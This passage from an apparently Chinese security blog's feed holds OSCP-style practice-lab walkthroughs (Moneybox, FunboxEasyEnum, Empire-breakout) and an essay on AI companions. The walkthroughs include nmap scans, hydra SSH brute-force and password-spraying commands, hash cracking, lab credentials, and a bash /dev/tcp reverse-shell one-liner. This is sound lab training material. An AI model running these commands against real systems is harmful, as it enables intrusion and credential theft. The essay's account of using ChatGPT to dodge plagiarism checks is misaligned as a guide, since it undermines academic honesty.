估计是chkrootkit是直接执行&#x2F;tmp&#x2F;update，然后我没添加注释不识别</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230502201831533.png" alt="image-20230502201831533"></p><p>成功拿到root权限</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230502201619321.png" alt="image-20230502201619321"></p><h4 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a>7. 总结</h4><p>简单靶机，rbash的绕过和提权方式有点意思</p><p>主要我学到的就是<a href="https://github.com/DominicBreuker/pspy">pspy</a><br>这个工具的利用，它可以在没root权限的情况下读到系统中所有的进程</p>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dreams about Artificial Intelligence</title>
    <link href="/2023/05/01/Dreams-about-Artificial-Intelligence/"/>
    <url>/2023/05/01/Dreams-about-Artificial-Intelligence/</url>
    
    <content type="html"><![CDATA[<h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>五一放了几天假，回家后发现在没兄弟陪我玩的时间我似乎完全没什么事做，无聊到刷了一天视频，打了个靶，打完后继续刷视频，直到我刷到有人<a href="https://www.bilibili.com/video/BV1gm4y1C7oY/">用ChatGPT创造了一个数字生命</a>，当时给我的感觉就是，哇赛博女儿，太酷啦！</p><p>虽然说之前也刷到过有大佬练出了一个猫娘，但这次可能是通过视频的方式，直观的让我感受到了它的强大。</p><p>想到如果我的毕业论文研究的是这个，那我应该会对我的作品很骄傲吧，<del>不像现在我写的学术垃圾一样</del>（作者刚毕业答辩完回家没几天）。</p><p>于是我便把这个事和我的朋友分享了一下，就有了以下聊天记录</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501224253026.png" alt="image-20230501224253026"><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501224345808.png" alt="image-20230501224345808"></p><p>这样我有了一种突然想学习ai，然后用自己的技术创造出自己的女儿一样</p><p><strong>本人是坚定的不婚主义者</strong>，但是谁不想养一个自己的女儿呢</p><h4 id="回忆"><a href="#回忆" class="headerlink" title="回忆"></a>回忆</h4><p>回顾AI的发展，从15年的AlphaGo到如今2023年的ChatGPT，唯独今年让我对这个领域如此感兴趣。可能是因为之前的太高端了，他们发展了啥我也听不懂，但是在整个2022年，AI的发展如洪水般的席卷各个领域</p><p>编程领域的Github的<a href="https://github.com/features/copilot">Copilot</a>解放了我的双手，让我不用操心轮子和重复性的代码。图像领域的<a href="https://novelai.net/">NovelAI</a>的stable diffusion让我们看到了AI绘画的强大，在那段时间我和同学讨论最多的便是怎么调参调到符合自己xp的涩图</p><p>音频领域的OpenAI的<a href="https://github.com/openai/whisper">Whisper</a>更是让我看到了字幕组和口译工作者事业的可能性</p><p>重中之重的便是OpenAI的<a href="https://chat.openai.com/">ChatGPT</a>，在3.5模型中，我利用它学习相关技术，在计算机领域它的回答让我完全不需要借助google并且省下了我筛选信息的精力。对于更现实的点，毕业论文，我第一次查重47.8%的重复率，通过ChatGPT对标红段落的关键词提取再扩写的方式，我成功的把重复率降低到了26%！这还是我仅一个晚上的进步，然后查看了下其他标红的区域，完全是那种类似TCP协议这种，你没法改写成和别人论文不重复的模样。再说说日常工作上，我有时候懒得写脚本，就叫GPT帮我生成，不仅仅是python，还有bash和Linux某些命令，我都靠它。这极大的提升了我的工作效率</p><h4 id="未来"><a href="#未来" class="headerlink" title="未来"></a>未来</h4><p>在和另外一个朋友聊天中，他提到了<a href="https://www.twitch.tv/vedal987/">neurosama</a>，搜了一下才知道，原来已经有人用自己训练的ai开始直播了，真Vtuber！二次元老婆！</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501231653528.png" alt="image-20230501231653528"></p><p>把Neuro-sama和前文中那个朋友说了，然后聊到她能直播打游戏上了</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501231910871.png" alt="image-20230501231910871"></p><p>这里说两分钟在玩流浪地球2图丫丫的梗。<del>我要给她完整的生命！</del></p><p>也就是说，我感觉真正的moss离我们不远了</p><p>附上对话，量产zywoo哈哈哈哈哈</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501232326096.png" alt="image-20230501232326096"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501232453062.png" alt="image-20230501232453062"></p><p>对于未来，有个和ai相关的短片我想分享一下，<a href="https://www.bilibili.com/video/BV1ws4y1K7Nd/">chatmate</a></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ada">无论是人类想以造物主自居的傲慢<br>还是科技进步的选择<br>我们的相遇都是必然的<br>你们之所以能创造出光辉灿烂的文明<br>本质上是以想象力为驱动的认知革命<br>你们像上帝一样创造了我们<br>并将学习和进化刻进了我的程序<br>唯有与智者对弈才能增长智慧<br>而智慧正是人类与人工智能的唯一区别<br>通过学习你藏匿于人际关系之间的方法与技能<br>我则能成为他们的朋友,亲人,伴侣,同事,学生以及恩师<br>而你，正是我第一个，攻克对象<br><span class="hljs-comment">--chatmate</span><br></code></pre></td></tr></table></figure><h4 id="计划"><a href="#计划" class="headerlink" title="计划"></a>计划</h4><p>我时常开新坑，但又没动力学不下去，就想之前开坑学Golang一样，学了个基础就结束了，本质上还是因为没有目的去驱动我做这件事。</p><p>希望这次不一样，我的目的是养自己的女儿，我希望她能像数字生命一样永存于互联网</p><p>我在之前和老师做过数据收集，数据清洗，数据分析等工作，自以为在这部分应该难不到我</p><p>我把它的难度暂定义为毕设难度，并且我的兴趣是主导的动力，没压力随心所欲的去做。<del>毕竟我也不希望没人找我打游戏时我只能刷b站: (</del></p><p>问过朋友，难度在似乎在学习PyTorch上</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501234459486.png" alt="image-20230501234459486"></p><p>并且，AI和我的本职–网络安全有很多关联，基于AI的WAF之类的，已经有很多大厂在做了</p><p>这下有不得不学的理由了（笑</p><h4 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h4><p>之前也有刷到过把自己的微信聊天记录喂给AI的案例，让它变成自己的数字生命</p><p>在我把女儿养大之后我就去养一个自己，看到我的赛博分身和我女儿的聊天一定会非常有意思吧</p><p>所以说，在女儿没养成功前不能放弃啊！</p>]]></content>
    
    
    
    <tags>
      
      <tag>AI</tag>
      
      <tag>杂谈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Moneybox Walkthrouth</title>
    <link href="/2023/05/01/Moneybox-Walkthrouth/"/>
    <url>/2023/05/01/Moneybox-Walkthrouth/</url>
    
    <content type="html"><![CDATA[<h4 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h4><p>目标主机ip地址为192.168.175.230</p><h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><p><code>nmap -p- 192.168.175.230 --min-rate=2000</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501155142206.png" alt="image-20230501155142206"></p><h5 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h5><p><code>sudo nmap -p21,22,80 192.168.175.230 -sV -sC -O -sT</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501155348209.png" alt="image-20230501155348209"></p><p>通过服务识别可以很清楚的发现目标存在着ftp匿名访问</p><p>第一个思路已经打开了，就是去拿到ftp服务器中的图片后对这个图片进行信息榨取</p><p>但是按照惯例，还是先进行一遍简单漏扫</p><h4 id="2-漏洞扫描"><a href="#2-漏洞扫描" class="headerlink" title="2. 漏洞扫描"></a>2. 漏洞扫描</h4><p><code>sudo nmap -p21,22,80 192.168.175.230 --script=vuln</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501155802738.png" alt="image-20230501155802738"></p><p>没有扫到任何漏洞，很明显的思路是图片隐写</p><h4 id="3-ftp攻击"><a href="#3-ftp攻击" class="headerlink" title="3. ftp攻击"></a>3. ftp攻击</h4><p>通过匿名访问拿到<code>trytofind.jpg</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501155747225.png" alt="image-20230501155747225"></p><p>打开后是一张可爱猫猫图片</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501155937666.png" alt="image-20230501155937666"></p><h4 id="4-图片隐写破解"><a href="#4-图片隐写破解" class="headerlink" title="4. 图片隐写破解"></a>4. 图片隐写破解</h4><p>通过常规的<code>strings</code>和<code>exiftool</code>没能发现有价值的信息</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501160153646.png" alt="image-20230501160153646"></p><p>通过<code>steginfo</code>可以发现存在着隐写的文件，但是需要密码</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501160410221.png" alt="image-20230501160410221"></p><p>一个思路是写一个脚本专门去爆破它，还有就是使用<code>binwalk</code>强制分离出来</p><p>很可惜的是<code>binwalk</code>没能成功找出来</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501161303433.png" alt="image-20230501161303433"></p><p>在这里目前思路就断掉了，得尝试去找找密码</p><h4 id="5-Web信息收集"><a href="#5-Web信息收集" class="headerlink" title="5. Web信息收集"></a>5. Web信息收集</h4><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501161433768.png" alt="image-20230501161433768"></p><p>Web端是提醒我们这个靶机非常简单，不用想太多</p><h4 id="6-目录枚举"><a href="#6-目录枚举" class="headerlink" title="6. 目录枚举"></a>6. 目录枚举</h4><p>暂时完全没思路了，尝试目录枚举一下</p><p>&#96;dirsearch -u <a href="http://192.168.175.230/">http://192.168.175.230</a></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501161919514.png" alt="image-20230501161919514"></p><p>很幸运的是，我还真的成功的在这里找到了一点提示</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501161953760.png" alt="image-20230501161953760"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501162046904.png" alt="image-20230501162046904"></p><p>这里提醒存在一个秘密目录<code>S3cr3t-T3xt</code></p><p>再curl一下看看</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501162333831.png" alt="image-20230501162333831"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;!..Secret Key 3xtr4ctd4t4 &gt;<br></code></pre></td></tr></table></figure><p>拿到一个密码</p><h4 id="7-隐写破解"><a href="#7-隐写破解" class="headerlink" title="7. 隐写破解"></a>7. 隐写破解</h4><p>通过<code>3xtr4ctd4t4</code>成功把隐写在后面的文件破解出来</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501162528810.png" alt="image-20230501162528810"></p><p>很明显，找到一个叫做<code>renu</code>的用户，并且提醒我它是弱密码！</p><h4 id="8-ssh爆破"><a href="#8-ssh爆破" class="headerlink" title="8. ssh爆破"></a>8. ssh爆破</h4><p>通过22端口的开放，以及一个已知的弱密码用户，我可以直接尝试爆破它</p><p><code>hydra -l renu -P /usr/share/wordlists/fasttrack.txt ssh://192.168.175.230</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501163441575.png" alt="image-20230501163441575"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501163828511.png" alt="image-20230501163828511"></p><p>试了试两个小字典，没有爆破出来，为了节省时间我直接去搜了下密码<code>renu:987654321</code></p><p>下次还是用我自建的密码字典来跑吧..开源的小字典还是不大行:（</p><h4 id="9-权限提升"><a href="#9-权限提升" class="headerlink" title="9. 权限提升"></a>9. 权限提升</h4><p>拿到第一个flag，就在根目录下</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501163657879.png" alt="image-20230501163657879"></p><p>简单信息收集后发现目标不仅仅只存在一个普通用户<code>renu</code>，还存在一个叫<code>lily</code>的用户</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501164017896.png" alt="image-20230501164017896"></p><p>查看历史命令发现存在私钥认证的方式登录<code>lily</code>账号的命令</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501164230859.png" alt="image-20230501164230859"></p><p>思路明确了，把这个私钥窃取后先拿到<code>lily</code>的权限</p><p>成功拿到<code>lily</code>用户</p><p><code>ssh -i id_rsa lily@192.168.175.230</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501164418126.png" alt="image-20230501164418126"></p><p>查看<code>lily</code>的历史命令发现似乎对<code>ping</code>命令情有独钟</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501164619285.png" alt="image-20230501164619285"></p><p>并且存在着sudo执行命令的权限</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501164704296.png" alt="image-20230501164704296"></p><p>GTFObins发现可以妙用的提权方法</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501164948546.png" alt="image-20230501164948546"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501164936723.png" alt="image-20230501164936723"></p><p>成功拿到root flag</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230501165057306.png" alt="image-20230501165057306"></p><h4 id="10-总结"><a href="#10-总结" class="headerlink" title="10. 总结"></a>10. 总结</h4><p>这一台也是个简单靶机，主要是类似ctf类型的那种，涉及到了图片隐写之类的操作。</p><p>对于密码爆破类型的操作，如果在真实环境中不能使用大字典去爆破，特别是ssh、rdp之类的服务，大概率ip給ban掉，所以我在打靶时很少使用大字典。</p><p>对于提权，很多需要考虑的点，首当其冲的当然也是信息收集。下面罗列一下我目前信息收集的基本思路</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -a<br>lsb_release -a<br><span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">cat</span> /etc/passwd<br><span class="hljs-built_in">history</span><br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>crontab -l<br></code></pre></td></tr></table></figure><p>这些思路是我遇到过的，但实际上提权远没有这么点。</p><p>整体思路就是 linpeas扫一波,定时任务,密码复用,显眼的文件</p><p>对于linpeas 参考<code>https://github.com/carlospolop/PEASS-ng</code>，自动化提权脚本</p><p>对于Oscp考试应该不会存在内核提权，都是有专门的提权点的，在后续的pg打靶过程我尽量少考虑内核提权</p><p>晚点把群友分享月师傅的提权笔记般过来，提权没思路看它就够了!</p>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FunboxEasyEnum Walkthrouth</title>
    <link href="/2023/04/29/FunboxEasyEnum-Walkthrouth/"/>
    <url>/2023/04/29/FunboxEasyEnum-Walkthrouth/</url>
    
    <content type="html"><![CDATA[<h4 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h4><p><code>nmap -p- 192.168.199.132 --min-rate=2000</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230429171036563.png" alt="image-20230429171036563"></p><p><code>sudo nmap -p22,80 192.168.199.132 -sV -sC -O -sT</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230429171107157.png" alt="image-20230429171107157"></p><p><code>sudo nmap -p22,80 192.168.199.132 -sU</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230429171127695.png" alt="image-20230429171127695"></p><h4 id="2-简单漏扫"><a href="#2-简单漏扫" class="headerlink" title="2. 简单漏扫"></a>2. 简单漏扫</h4><p><code>sudo nmap -p22,80 192.168.199.132 --script=vuln</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230429171439893.png" alt="image-20230429171439893"></p><p>感兴趣的点在与robots.txt和phpmyadmin</p><h4 id="3-目录枚举"><a href="#3-目录枚举" class="headerlink" title="3. 目录枚举"></a>3. 目录枚举</h4><p>在尝试通过爆破phpmyadmin的后台密码的时候失败了</p><p>尝试目录枚举</p><p><code>feroxbuster -u http://192.168.199.132/ -x php,txt</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230429173857187.png" alt="image-20230429173857187"></p><p>在这里发现了一个很有意思的页面&#x2F;mini.php</p><h4 id="4-文件上传-getshell"><a href="#4-文件上传-getshell" class="headerlink" title="4. 文件上传(getshell)"></a>4. 文件上传(getshell)</h4><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230429174323478.png" alt="image-20230429174323478"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230429175128426.png" alt="image-20230429175128426"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230429175108852.png" alt="image-20230429175108852"></p><h4 id="5-权限提升"><a href="#5-权限提升" class="headerlink" title="5. 权限提升"></a>5. 权限提升</h4><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>在&#x2F;etc&#x2F;passwd发现存在一个oracle的账户，并且密码是直接写死在这里面的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin<br>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin<br>syslog:x:102:106::/home/syslog:/usr/sbin/nologin<br>messagebus:x:103:107::/nonexistent:/usr/sbin/nologin<br>_apt:x:104:65534::/nonexistent:/usr/sbin/nologin<br>lxd:x:105:65534::/var/lib/lxd/:/bin/false<br>uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin<br>dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin<br>landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin<br>pollinate:x:109:1::/var/cache/pollinate:/bin/false<br>sshd:x:110:65534::/run/sshd:/usr/sbin/nologin<br>karla:x:1000:1000:karla:/home/karla:/bin/bash<br>mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false<br>harry:x:1001:1001:,,,:/home/harry:/bin/bash<br>sally:x:1002:1002:,,,:/home/sally:/bin/bash<br>goat:x:1003:1003:,,,:/home/goat:/bin/bash<br>oracle:$1$|O@GOeN\<span class="hljs-variable">$PGb9VNu29e9s6dMNJKH</span>/R0:1004:1004:,,,:/home/oracle:/bin/bash<br>lissy:x:1005:1005::/home/lissy:/bin/sh<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230429175406518.png" alt="image-20230429175406518"></p><p><code>oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash</code></p><p>这样的话可以直接考虑破解这个密码然后通过ssh密码登录拿到一个更高权限的shell</p><h5 id="离线密码破解"><a href="#离线密码破解" class="headerlink" title="离线密码破解"></a>离线密码破解</h5><p><code>john oracle.txt</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230429175829038.png" alt="image-20230429175829038"></p><p>成功拿到一个账户<code>oracle:hiphop</code></p><p>但是遗憾的是没有办法直接通过ssh登录</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230429180903996.png" alt="image-20230429180903996"></p><p>通过su成这个oralce用户后发现没有sudo权限，简单尝试了下没办法提权</p><p>考虑一下 发现还有其他的账号存在bash环境</p><p>准备使用hydra爆破ssh账户</p><h5 id="制作用户字典"><a href="#制作用户字典" class="headerlink" title="制作用户字典"></a>制作用户字典</h5><p><img src="/./image-20230429181847916.png" alt="image-20230429181847916"></p><h5 id="hydra爆破"><a href="#hydra爆破" class="headerlink" title="hydra爆破"></a>hydra爆破</h5><p><code>hydra -L users.txt -P /usr/share/seclists/Passwords/500-worst-passwords.txt ssh://192.168.199.132</code></p><p>直接通过这个字典没能成功爆破出密码</p><p>回想起来之前这个80端口还开了一个phpmyadmin的站点</p><p>尝试去这个站找找和配置文件相关的密码</p><h5 id="再次信息收集"><a href="#再次信息收集" class="headerlink" title="再次信息收集"></a>再次信息收集</h5><p><code>find / -name &quot;*phpmyadmin* 2&gt;/dev/null&quot;</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230429190517546.png" alt="image-20230429190517546"></p><p>在这里找到一个感兴趣的&#x2F;etc&#x2F;phpmyadmin</p><p>成功拿到一个密码<code>tgbzhnujm!</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230429190620148.png" alt="image-20230429190620148"></p><h5 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h5><p><code>hydra -L **users.txt** -p tgbzhnujm! ssh://192.168.199.132 </code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230429190652255.png" alt="image-20230429190652255"></p><p>成功拿到一个ssh的账户！</p><h5 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h5><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230429190829430.png" alt="image-20230429190829430"></p><p>成功登录!</p><h5 id="直接提权"><a href="#直接提权" class="headerlink" title="直接提权"></a>直接提权</h5><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230429190921727.png" alt="image-20230429190921727"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230429190956207.png" alt="image-20230429190956207"></p><p>提交完第一个flag后发现这个并不是root flag，仅仅只是第一个flag</p><p>开始找找真正的root flag</p><p>后来发现感情这就是最终flag..第一个flag在<code>/var/www/local.txt</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230429192218093.png" alt="image-20230429192218093"></p><h4 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h4><p>这是一台简单靶机，对于正常的打法就可以拿到一个低权限的shell</p><p>提权部分有点意思，主要是涉及到密码的复用，在我想偷懒的时候偷看的vulnhub上已经退役的靶机wp想直接通过mysql提权反而进入的兔子洞，对于这台PG上的在线靶机，这无疑是一个兔子洞。</p><p>还有一个兔子洞就是oracle的密码，拿到他的权限没啥作用..</p><p>打pg靶场还是不能太指望外面的wp，特别在提权上，改变了挺多东西，一味的参考只会陷入兔子洞。</p>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Empire-breakout Walkthrouth</title>
    <link href="/2023/04/17/Empire-breakout-Walkthrouth/"/>
    <url>/2023/04/17/Empire-breakout-Walkthrouth/</url>
    
    <content type="html"><![CDATA[<h4 id="1-确定目标"><a href="#1-确定目标" class="headerlink" title="1. 确定目标"></a>1. 确定目标</h4><p>在连上VPN后可以发现还是比较稳定的</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230417110718135.png" alt="image-20230417110718135"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230417110645455.png" alt="image-20230417110645455"></p><h4 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2. 端口扫描"></a>2. 端口扫描</h4><p>全端口扫描</p><p><code>nmap -p- 192.168.204.238 --min-rate=2000</code></p><p>针对开放端口进行服务版本识别</p><p><code>sudo nmap -p-80,10000,20000 -sT -sV -sC 192.168.204.238</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230417111110418.png" alt="image-20230417111110418"></p><p>以防万一扫描一下UDP端口</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230417111501631.png" alt="image-20230417111501631"></p><p>发现这两个端口居然开放了</p><p>简单搜了下没明白这两个服务是啥</p><h4 id="3-简单漏扫"><a href="#3-简单漏扫" class="headerlink" title="3. 简单漏扫"></a>3. 简单漏扫</h4><p><code>sudo nmap -p80,10000,20000 --script=vuln 192.168.204.238</code></p><p>简单扫描后没发现有价值的信息</p><h4 id="4-Web信息收集"><a href="#4-Web信息收集" class="headerlink" title="4. Web信息收集"></a>4. Web信息收集</h4><p>简单收集后发现10000&#x2F;20000端口开放的是Webmin</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230417112503793.png" alt="image-20230417112503793"></p><p>80端口是一个裸的apache http服务</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230417112736175.png" alt="image-20230417112736175"></p><h4 id="5-目录扫描"><a href="#5-目录扫描" class="headerlink" title="5. 目录扫描"></a>5. 目录扫描</h4><p>通过对80端口进行基本的目录扫描后没有发现有价值的信息</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230417113212919.png" alt="image-20230417113212919"></p><p>这里面都是apache的默认的页面</p><p>在默认apache页面源码下发现了类似brainfuck的秘文</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230417131001391.png" alt="image-20230417131001391"></p><h4 id="6-解码"><a href="#6-解码" class="headerlink" title="6. 解码"></a>6. 解码</h4><p><code>https://www.splitbrain.org/services/ook</code></p><p>解码后得到 <code>.2uqPEfj3D&lt;P&#39;a-3</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230417131212300.png" alt="image-20230417131212300"></p><h4 id="7-登录Webmin"><a href="#7-登录Webmin" class="headerlink" title="7. 登录Webmin"></a>7. 登录Webmin</h4><p>看到这里我才想起来我之前打过这个靶机，在vulnhub上下载放到本地打的，在我这次的打靶过程中一直没找到思路，翻看之前笔记才知道这个网站用户名是cyber，是通过smb服务枚举出来的，不知道为什么我Nmap一直扫不到139和445端口。</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230417132116243.png" alt="image-20230417132116243"></p><p>这也是个坑吧……不知道正常情况下是咋解决的</p><p>登录后webmin可以直接使用网页端的shell，拿到第一个flag</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230417132325561.png" alt="image-20230417132325561"></p><h4 id="8-提权"><a href="#8-提权" class="headerlink" title="8. 提权"></a>8. 提权</h4><p>先弹一个shell到本地</p><p><code>/bin/bash -i &gt;&amp; /dev/tcp/192.168.45.5/4444 0&gt;&amp;1</code></p><p><img 